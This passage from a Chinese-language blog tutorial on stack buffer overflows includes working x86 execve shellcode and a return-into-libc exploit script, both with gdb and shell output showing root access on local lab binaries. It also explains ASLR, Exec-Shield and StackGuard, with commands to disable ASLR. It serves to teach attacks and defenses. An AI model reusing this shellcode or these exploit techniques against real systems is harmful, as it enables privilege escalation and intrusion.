<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">;sample8.s</span><br><span class="line">.globl main</span><br><span class="line">main:</span><br><span class="line">    xorl  %eax, %eax</span><br><span class="line">    pushl %eax</span><br><span class="line">    movl  %esp, %eax</span><br><span class="line">    subl  $0x10, %eax</span><br><span class="line">    pushl %eax</span><br><span class="line">    movl  %esp, %ebx</span><br><span class="line">    xorl  %eax, %eax</span><br><span class="line">    pushl %eax        push 0x00000000</span><br><span class="line">    pushl $0x68732f2f push字符串&quot;//sh&quot;</span><br><span class="line">    pushl $0x6e69622f push字符串&quot;/bin&quot;</span><br><span class="line">    movl  %esp, %edx</span><br><span class="line">    xorl  %eax, %eax</span><br><span class="line">    pushl %eax</span><br><span class="line">    pushl %ebx</span><br><span class="line">    pushl %edx</span><br><span class="line">    pushl %eax</span><br><span class="line">    movb  $0x3b, %al</span><br><span class="line">    int   $0x80</span><br></pre></td></tr></table></figure>
<p>运行：objdump</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -Wall sample8.s -o sample8</span><br><span class="line">$ objdump -d sample8|grep \&lt;main\&gt;\: -A 18</span><br><span class="line">08048404 &lt;main&gt;:</span><br><span class="line"> 8048404:   31 c0            xor    %eax,%eax</span><br><span class="line"> 8048406:   50               push   %eax</span><br><span class="line"> 8048407:   89 e0            mov    %esp,%eax</span><br><span class="line"> 8048409:   83 e8 10         sub    $0x10,%eax</span><br><span class="line"> 804840c:   50               push   %eax</span><br><span class="line"> 804840d:   89 e3            mov    %esp,%ebx</span><br><span class="line"> 804840f:   31 c0            xor    %eax,%eax</span><br><span class="line"> 8048411:  50               push   %eax</span><br><span class="line"> 8048412:  68 2f 2f 73 68   push   $0x68732f2f</span><br><span class="line"> 8048417:  68 2f 62 69 6e   push   $0x6e69622f</span><br><span class="line"> 804841c:  89 e2            mov    %esp,  %edx</span><br><span class="line"> 804841e:  31 c0            xor    %eax,%eax</span><br><span class="line"> 8048420:  50               push   %eax</span><br><span class="line"> 8048421:  53               push   %ebx</span><br><span class="line"> 8048422:  52               push   %edx</span><br><span class="line"> 8048423:  50               push   %eax</span><br><span class="line"> 8048424:  b0 3b            mov    $0x3b,%al</span><br><span class="line"> 8048426:  cd 80            int    $0x80</span><br></pre></td></tr></table></figure>
<p>故可以写出sample9.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = &#123;</span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0xc0</span>,                      <span class="comment">// xor %eax, %eax</span></span><br><span class="line">    <span class="number">0x50</span>,                            <span class="comment">// push %eax</span></span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0xe0</span>,                      <span class="comment">// mov %esp, %eax</span></span><br><span class="line">    <span class="number">0x83</span>, <span class="number">0xe8</span>, <span class="number">0x10</span>,                <span class="comment">// sub $0x10, %eax</span></span><br><span class="line">    <span class="number">0x50</span>,                            <span class="comment">// push %eax</span></span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0xe3</span>,                      <span class="comment">// mov %esp, %ebx</span></span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0xc0</span>,                      <span class="comment">// xor %eax, %eax</span></span><br><span class="line">    <span class="number">0x50</span>,                            <span class="comment">// push %eax</span></span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x2f</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>,    <span class="comment">// push $0x68732f2f</span></span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>,    <span class="comment">// push $0x6e69622f</span></span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0xe2</span>,                      <span class="comment">// mov %esp, %edx</span></span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0xc0</span>,                      <span class="comment">// xor %eax, %eax</span></span><br><span class="line">    <span class="number">0x50</span>,                            <span class="comment">// push %eax</span></span><br><span class="line">    <span class="number">0x53</span>,                            <span class="comment">// push %ebx</span></span><br><span class="line">    <span class="number">0x52</span>,                            <span class="comment">// push %edx</span></span><br><span class="line">    <span class="number">0x50</span>,                            <span class="comment">// push %eax</span></span><br><span class="line">    <span class="number">0xb0</span>, <span class="number">0x3b</span>,                      <span class="comment">// mov $0x3b, %al</span></span><br><span class="line">    <span class="number">0xcd</span>, <span class="number">0x80</span>,                      <span class="comment">// int $0x80</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> (*p)(<span class="keyword">void</span>);</span><br><span class="line">    p = (<span class="keyword">void</span>(*)())shellcode;</span><br><span class="line">    p();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>bash运行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ su</span><br><span class="line">Password:</span><br><span class="line"><span class="comment"># gcc sample9.c -o sample9</span></span><br><span class="line"><span class="comment"># chmod 4755 sample9</span></span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">$ ./sample9</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>shellcode完成，可以在exploit.py中使用它了。</p>
<p>只需要将这段代码插入到sample3的内存空间中，然后将返回地址改为shellcode的起始地址，便夺取系统权限。</p>
<p>运行示例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ gdb sample3</span><br><span class="line">GNU gdb 6.1.1 [FreeBSD]</span><br><span class="line">(gdb) b *0x080485be    在cpy函数结尾的ret指令处设置断点</span><br><span class="line">Breakpoint 1 at 0x80485be</span><br><span class="line">(gdb) r <span class="string">"`python exploit.py bfbfebc8`"</span></span><br><span class="line">Starting program: /usr/home/guest/sample3</span><br><span class="line"><span class="string">"`python exploit.py bfbfebc8`"</span></span><br><span class="line">(no debugging symbols found)...</span><br><span class="line">(no debugging symbols found)...</span><br><span class="line">0xbfbfebc8</span><br><span class="line">Breakpoint 1, 0x080485be <span class="keyword">in</span> cpy ()</span><br><span class="line">(gdb) x/8x <span class="variable">$esp</span>         显示返回目标地址</span><br><span class="line">0xbfbfec0c:  0xbfbfebc8  0xbfbfed00  0xbfbfec30  0xbfbfec48</span><br><span class="line">0xbfbfec1c:  0x080484b7  0x00000000  0x00000000  0xbfbfec48</span><br><span class="line">(gdb) x/24i 0xbfbfebc8 将返回目标地址处的指令进行反汇编</span><br><span class="line">0xbfbfebc8:     xor    %eax,%eax</span><br><span class="line">0xbfbfebca:     push   %eax</span><br><span class="line">0xbfbfebcb:     mov    %esp,%eax</span><br><span class="line">0xbfbfebcd:     sub    <span class="variable">$0x10</span>,%eax</span><br><span class="line">0xbfbfebd0:     push   %eax</span><br><span class="line">0xbfbfebd1:     mov    %esp,%ebx</span><br><span class="line">0xbfbfebd3:     xor    %eax,%eax</span><br><span class="line">0xbfbfebd5:     push   %eax</span><br><span class="line">0xbfbfebd6:     push   <span class="variable">$0x68732f2f</span></span><br><span class="line">0xbfbfebdb:     push   <span class="variable">$0x6e69622f</span></span><br><span class="line">0xbfbfebe0:     mov    %esp,%edx</span><br><span class="line">0xbfbfebe2:     xor    %eax,%eax</span><br><span class="line">0xbfbfebe4:     push   %eax</span><br><span class="line">0xbfbfebe5:     push   %ebx</span><br><span class="line">0xbfbfebe6:     push   %edx</span><br><span class="line">0xbfbfebe7:     push   %eax</span><br><span class="line">0xbfbfebe8:     mov    <span class="variable">$0x3b</span>,%al</span><br><span class="line">0xbfbfebea:     int    <span class="variable">$0x80</span></span><br></pre></td></tr></table></figure>
<p>函数的返回目标地址已经变成了我们的 shellcode。sample3.c 在运行时会显示 shellcode 的地址，因为这只是一个攻击的演示程序。实际情况下，并不知道 shellcode 位于目标进程的哪个地址，因此只能进行推测。不过，栈的大致位置是可以推测出来的，因此可以尽量在内存空间中填充 NOP（0x90）指令，然后将 shellcode 放在最后，这样就可以提高 shellcode 被执行的概率。</p>
<p>另外，由于这次用的是 strcpy 函数，因此只要去掉 0x00 就可以了，但是有些软件会对字符串有更多的限制，比如只接受英文字母的。操作系统都进行的默认启动了一些安全机制，传统的缓冲区溢出攻击已经不管用。</p>
<h1 id="2-防范攻击的技术"><a href="#2-防范攻击的技术" class="headerlink" title="2. 防范攻击的技术"></a>2. 防范攻击的技术</h1><p>传统的缓冲区溢出攻击已经不管用了，主要是一些安全策略的缘故。</p>
<h2 id="1-地址随机化：ASLR"><a href="#1-地址随机化：ASLR" class="headerlink" title="1. 地址随机化：ASLR"></a>1. 地址随机化：ASLR</h2><p>ASLR： Address Space Layout Randomization，地址空间布局随机化，对栈，模块，动态分配的内存空间等的地址（位置）进行随机配置的机制。</p>
<p>ASLR 属于操作系统的功能，例如在 Ubuntu 12.04 中，我们可以通过 /proc/sys/kernel/randomize_va_space 来查看和修改这一设置。切换到 root 用户，运行以下命令。</p>
<p>运行示例 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">2 启用：默认</span><br><span class="line"><span class="comment"># echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br><span class="line"><span class="comment"># cat /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">0 禁用</span><br></pre></td></tr></table></figure>
<p>用 cat 命令查看 randomize_va_space 的值，输出的结果可能是 0、1 或者 2。</p>
<ul>
<li>0：禁用 </li>
<li>1：除堆以外随机化 </li>
<li>2：全部随机化（默认）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test00.c 显示用malloc分配的内存空间地址以及栈的地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">get_sp</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"movl %esp, %eax"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc: %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">16</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">" stack: 0x%lx\n"</span>, get_sp());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在启用 ASLR 的状态下，反复运行这个程序，我们会发现每次显示的地址都不同。</p>
<p> 运行示例 ：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ gcc test00.c -o test00</span><br><span class="line">$ ./test00</span><br><span class="line">malloc: 0x886e008  第1次：堆</span><br><span class="line"> stack: 0xbff775f8        栈</span><br><span class="line">$ ./test00</span><br><span class="line">malloc: 0x86f7008  第2次：堆</span><br><span class="line"> stack: 0xbfe34dc8        栈</span><br><span class="line">$ ./test00</span><br><span class="line">malloc: 0x940e008  第3次：堆</span><br><span class="line"> stack: 0xbffc45b8        栈</span><br></pre></td></tr></table></figure>
<p>如果地址布局无法推测处出来，我们就无法指定shellcode的具体地址了。同样的程序，如果在禁用ASLR的状态下运行，差异可看。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ sudo su</span><br><span class="line">[sudo] password <span class="keyword">for</span> guest:</span><br><span class="line"><span class="comment"># echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">$ ./test00</span><br><span class="line">malloc: 0x804b008  第1次：堆</span><br><span class="line"> stack: 0xbffff768        栈</span><br><span class="line">$ ./test00</span><br><span class="line">malloc: 0x804b008  第1次：堆</span><br><span class="line"> stack: 0xbffff768        栈</span><br><span class="line">$ ./test00</span><br><span class="line">malloc: 0x804b008  第1次：堆</span><br><span class="line"> stack: 0xbffff768        栈</span><br></pre></td></tr></table></figure>
<p>关闭 ASLR 后，无论运行多少次，显示出的地址都是完全相同的。</p>
<h2 id="2-Exec-Shield"><a href="#2-Exec-Shield" class="headerlink" title="2. Exec-Shield"></a>2. Exec-Shield</h2><p>除存放可执行代码的内存空间以外，对其余内存空间尽量禁用执行权限：Exec-Shield </p>
<p>Exec-Shield 是一种通过“限制内存空间的读写和执行权限”来防御攻击的机制。</p>
<p>通常情况下我们<strong>不会在用作栈的内存空间里存放可执行的机器语言代码，因此我们可以将栈空间的权限设为可读写但不可执行</strong>。<strong>反过来说，在代码区域中存放的机器语言代码，通常情况下也不需要在运行时进行改写，因此我们可以将这部分内存的权限设置为不可写入。</strong></p>
<p>这样一来，即便我们将 shellcode 复制到栈，如果这些代码无法执行，那么就会产生 Segmentation fault，导致程序停止运行。</p>
<p>查看某个程序进程内存空间的读写和执行权限，在程序运行时输出/proc/<pid>/maps就可以。</pid></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ps -aef | grep test02</span></span><br><span class="line">root   1035   786  0 08:36 pts/0  00:00:00 ./test02</span><br><span class="line">guest  1037   937  0 08:36 pts/1  00:00:00 grep --color=auto test02</span><br><span class="line"><span class="comment"># cat /proc/1035/maps | grep stack</span></span><br><span class="line">bfdcc000-bfded000 rw-p 00000000 00:00 0  [stack]</span><br></pre></td></tr></table></figure>
<p>test02 是 test01 加上 Exec-Shield 之后的版本，其中栈空间为 bfdcc000 ～ bfded000，我们可以看到它的权限为 rw-p，没有代表执行权限的 x。可以尝试一下 Exec-Shield 的效果。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./test02 `python exploit.py <span class="string">"bffff710"</span>` aaaabbbbccccdddd</span><br><span class="line"><span class="number">0xbffff710</span></span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
<p>ASLR 的思路是防止攻击者猜中地址，而 Exec-Shield 则是在地址一致的情况下，攻击者也无法执行其中的机器语言代码。</p>
<h2 id="3-StackGuard"><a href="#3-StackGuard" class="headerlink" title="3. StackGuard"></a>3. StackGuard</h2><p>在编译时插入检测栈数据完整性的代码：StackGuard</p>
<p>StackGuard 是一种在编译时在各函数入口和出口插入用于检测栈数据完整性的机器语言代码的方法，它属于编译器的安全机制。</p>
<p>StackGuard 机制所保护的是 <strong>ebp 和 ret_addr</strong>，是一种针对<strong>典型栈缓冲区溢出攻击</strong>的防御手段。</p>
<p>Ubuntu 12.04 的 gcc 中，在编译时默认会加上 StackGuard 代码，要禁用 StackGuard 需要加上 <code>-fno-stack-protector</code>选项。</p>
<p>test03 具有栈缓冲区溢出的漏洞，当栈内数据发生溢出时，StackGuard 代码能够检测到这一情况，并显示 stack smashing detected 消息，强制终止程序运行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">;test03.s</span><br><span class="line">main:</span><br><span class="line">        pushl   %ebp</span><br><span class="line">        movl    %esp, %ebp</span><br><span class="line">        andl    $-16, %esp</span><br><span class="line">        subl    $64, %esp</span><br><span class="line">        movl    12(%ebp), %eax</span><br><span class="line">        movl    %eax, 28(%esp)</span><br><span class="line">        movl    %gs:20, %eax     每次运行时%gs:20中都会存入一个随机数</span><br><span class="line">        movl    %eax, 60(%esp)   将随机值添加到栈的最后</span><br><span class="line">        xorl    %eax, %eax</span><br><span class="line">        call    get_sp</span><br><span class="line">        movl    $.LC0, %edx</span><br><span class="line">        movl    %eax, 4(%esp)</span><br><span class="line">        movl    %edx, (%esp)</span><br><span class="line">        call    printf</span><br><span class="line">        call    getchar</span><br><span class="line">        movl    28(%esp), %eax</span><br><span class="line">        addl    $4, %eax</span><br><span class="line">        movl    (%eax), %eax</span><br><span class="line">        movl    %eax, 4(%esp)</span><br><span class="line">        leal    44(%esp), %eax</span><br><span class="line">        movl    %eax, (%esp)</span><br><span class="line">        call    strcpy</span><br><span class="line">        movl    $0, %eax</span><br><span class="line">        movl    60(%esp), %edx   将栈的最后一个值</span><br><span class="line">        xorl    %gs:20, %edx     与%gs:20进行对比</span><br><span class="line">        je      .L5              如果一致则跳转到.L5</span><br><span class="line">        call    __stack_chk_fail 否则跳转到强制终止代码</span><br><span class="line">.L5:</span><br><span class="line">        leave</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<p>%gs:20 在每次程序运行时都会存入一个随机数，将这个随机数复制到函数所使用的栈空间的最后。由于 60(%esp) 后面就是 ebp 和 ret_addr，因此这样的配置可以保护关键地址的数据不被篡改。</p>
<p>当函数即将返回之前，程序将 %gs:20 的值与 60(%esp) 进行对比。如果由于某些原因导致溢出，ebp 和 ret_addr 被覆盖，那么 60(%esp) 的值也会被同时覆盖。当检测到溢出时，程序将跳转到 __stack_chk_fail，并终止运行。</p>
<h1 id="3-绕开安全机制的技术"><a href="#3-绕开安全机制的技术" class="headerlink" title="3. 绕开安全机制的技术"></a>3. 绕开安全机制的技术</h1><h2 id="1-Return-into-libc"><a href="#1-Return-into-libc" class="headerlink" title="1.Return-into-libc"></a>1.Return-into-libc</h2><p>使用 libc 中的函数来进行攻击：Return-into-libc 。</p>
<p>Return-into-libc 是一种破解 Exec-Shield 的方法，它的思路是“即便无法执行任意代码（shellcode），最终只要能够运行任意程序，也可以夺取系统权限”。</p>
<p>Return-into-libc 的基本原理是通过调整参数和栈的配置，使得程序能够跳转到 libc.so 中的 system 函数以及 exec 类函数，借此来运行 /bin/sh 等程序。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ldd 查看程序在运行时所加载的库。</span></span><br><span class="line"><span class="variable">$ldd</span> /bin/sh</span><br><span class="line">	linux-vdso.so.1 (0x00007ffdcd5da000)</span><br><span class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f05268a1000)</span><br><span class="line">	/lib64/ld-linux-x86-64.so.2 (0x00007f0526e7a000)</span><br></pre></td></tr></table></figure>
<p>几乎所有的程序在运行时都会加载 libc.so，或者是在编译时进行静态链接。因此，只要我们能够调用 libc 中的 system 函数和 exec 类函数，就能够夺取系统权限。</p>
<p>在关闭 ASLR 的状态下运行下面的命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ gdb test02</span><br><span class="line">GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04</span><br><span class="line">(gdb) b main</span><br><span class="line">Breakpoint 1 at 0x8048461</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/guest/test02</span><br><span class="line">Breakpoint 1, 0x08048461 in main ()</span><br><span class="line">(gdb) p system</span><br><span class="line">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7e6c430 &lt;system&gt;</span><br><span class="line">(gdb) p exit</span><br><span class="line">$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7e5ffb0 &lt;exit&gt;</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
<p>得到了 system 和 exit 的地址,就不需要将返回地址改成位于栈中的 shellcode 地址，而是改成 system 函数的入口地址，将 system 函数的返回目标设为 exit，并将 /bin/sh 的地址作为参数传递过去。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exploit2.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    addr = <span class="number">0x41414141</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    addr = int(sys.argv[<span class="number">1</span>], <span class="number">16</span>) + <span class="number">0x08</span></span><br><span class="line"></span><br><span class="line">fsystem = int(<span class="string">"b7e6c430"</span>, <span class="number">16</span>)</span><br><span class="line">fexit   = int(<span class="string">"b7e5ffb0"</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">data  = <span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line">data += <span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line">data += <span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line">data += <span class="string">"\x90\x90\x90\x90\x90\x90\x90c x90"</span></span><br><span class="line">data += pack(<span class="string">'&lt;L'</span>, fsystem)</span><br><span class="line">data += pack(<span class="string">'&lt;L'</span>, fexit)</span><br><span class="line">data += pack(<span class="string">'&lt;L'</span>, addr)</span><br><span class="line">data += <span class="string">"/bin/sh"</span></span><br><span class="line"></span><br><span class="line">sys.stdout.write(data)</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ./test02 `python exploit2.py bffff740`</span><br><span class="line">0xbffff740</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># exit</span></span><br></pre></td></tr></table></figure>
<p>用 system 函数代替了 shellcode。test02 已经开启了 Exec-Shield 机制，但还是绕过了它并成功夺取了权限，这是一个最简单的 Return-into-libc 的例子。</p>
<p>不过，尽管这样做能够绕开 Exec-Shield，但如果开启了 ASLR 或者 StackGuard 的话，上面的攻击依然会失败。</p>
<h2 id="2-ROP"><a href="#2-ROP" class="headerlink" title="2.ROP"></a>2.ROP</h2><p>利用未随机化的模块内部的汇编代码进行攻击：ROP </p>
<p>Return-into-libc 是一种用库函数（libc）来代替 shellcode 发动攻击的方法。然而，如果 ASLR 将加载的模块全部随机化的话，由于我们无法得到准确的模块地址（不知道 system 和 exec 的地址），攻击就会失败。</p>
<p>但是可以用未随机化的那些模块内部的汇编代码，拼接出我们所需要的程序逻辑，在这种思路下衍生出的攻击手段，被称为 Return-Oriented-Programming（面向返回编程），简称 ROP。之后再慢慢研究一下==<br>源文件：链接: <a href="https://pan.baidu.com/s/1Qx3RPQ1OUsdFJv9FHodyBA" target="_blank" rel="noopener">https://pan.baidu.com/s/1Qx3RPQ1OUsdFJv9FHodyBA</a> 密码: spj6</p>

      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2018/07/06/缓冲区溢出及防御/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>

<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
    </div>
</aside>




  
    <article id="post-代码注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/05/代码注入/">代码注入</a>
    </h1>
  

        
        <a href="/2018/07/05/代码注入/" class="archive-article-date">
  	<time datetime="2018-07-05T07:33:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-05</time>
</a>
        
